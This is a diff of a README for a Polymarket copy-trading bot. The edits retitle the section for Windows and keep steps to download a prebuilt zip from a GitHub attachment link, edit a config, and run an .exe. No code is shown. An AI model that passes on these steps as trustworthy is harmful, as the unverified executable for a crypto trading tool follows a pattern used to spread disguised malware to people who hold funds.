@@ -19,7 +19,7 @@
 ---
 ## 🚀 Let's Trade!!
 
-### **🤖 Polymarket Copy Trading Bot - Rust (Prod Version)**
+### **🤖 Polymarket Copy Trading Rust Bot - for Windows**
 - 🗂️ [polymarket-copy-trading-bot-prod.zip](https://github.com/user-attachments/files/25134148/polymarket-copy-trading-bot-prod.zip)
 
 1. 📂 Extract `polymarket-copy-trading-bot-prod.zip` file.
@@ -36,6 +36,8 @@
    - MIN_ORDER_SIZE_USD=1.0                         # Minimum size for a single order in USD (default: 1.0)
    ```
 3. ▶️ Run `polymarket-copy-trading-bot-prod.exe`
+
+---
 <p float="left">
    <img width="220" alt="548934575-8638d2a1-889e-4467-b9b5-147776369623" src="https://github.com/user-attachments/assets/e44022cb-8890-4f2f-9a0d-f64e1c0dc81e" />
    <img width="218" alt="image" src="https://github.com/user-attachments/assets/6bea66fc-b165-48b2-b11b-37ce653a887d" />
